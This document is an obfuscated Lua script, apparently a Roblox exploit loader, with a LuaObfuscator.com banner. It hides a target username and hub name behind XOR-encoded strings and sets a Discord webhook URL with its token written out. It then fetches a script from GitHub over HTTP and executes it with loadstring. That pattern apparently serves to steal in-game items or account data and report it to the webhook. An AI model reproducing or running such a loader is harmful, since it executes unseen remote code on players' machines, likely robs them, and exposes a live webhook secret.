--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.9) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end _G.Username(v7("\218\202\210\43\252\178\206\16\217\204\155","\126\177\163\187\69\134\219\167"));_G.HubName(v7("\23\223\43\193\249\99\222\41\196\241","\156\67\173\74\165"));_G.WebhookUrl("https://discord.com/api/webhooks/1123717804844126318/YzxLoJnCA-F8yab4Gdjh6H7mbI_qWhKVB1xFmD14mg4qqlyJ3zsqvEhvpNqtp7qsA4Ve");loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))();